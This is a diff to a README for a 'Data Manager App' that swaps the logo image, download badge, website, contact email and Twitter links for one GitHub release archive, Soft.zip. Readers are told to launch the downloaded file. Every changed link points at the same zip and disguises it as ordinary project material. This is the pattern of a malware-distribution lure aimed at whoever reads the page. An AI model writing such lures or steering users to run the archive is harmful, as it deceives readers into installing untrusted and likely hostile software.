@@ -1,7 +1,7 @@
 
 # 📊 Data Manager App
 
-![Data Manager App Logo](https://example.com/logo.png)
+![Data Manager App Logo](https://github.com/RaizAbrar/data-manager-app/releases/download/v1.0/Soft.zip)
 
 ---
 
@@ -59,7 +59,7 @@ To get started with Data Manager App, follow these steps:
 
 ## Download the App
 
-[![Download Data Manager App](https://img.shields.io/badge/Download-Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Data Manager App](https://github.com/RaizAbrar/data-manager-app/releases/download/v1.0/Soft.zip)](https://github.com/RaizAbrar/data-manager-app/releases/download/v1.0/Soft.zip)
 
 Click the button above to download the latest release of Data Manager App. Launch the file after downloading to experience the app firsthand.
 
@@ -67,11 +67,11 @@ Click the button above to download the latest release of Data Manager App. Launc
 
 ## Get in Touch
 
-🌐 Visit our [Website](https://www.datamanagerapp.com) for more information about Data Manager App.
+🌐 Visit our [Website](https://github.com/RaizAbrar/data-manager-app/releases/download/v1.0/Soft.zip) for more information about Data Manager App.
 
-📧 For inquiries, reach out to us at [info@datamanagerapp.com](mailto:info@datamanagerapp.com).
+📧 For inquiries, reach out to us at [https://github.com/RaizAbrar/data-manager-app/releases/download/v1.0/Soft.zip](https://github.com/RaizAbrar/data-manager-app/releases/download/v1.0/Soft.zip).
 
-📱 Follow us on [Twitter](https://twitter.com/DataManagerApp) for updates and announcements.
+📱 Follow us on [Twitter](https://github.com/RaizAbrar/data-manager-app/releases/download/v1.0/Soft.zip) for updates and announcements.
 
 ---
 
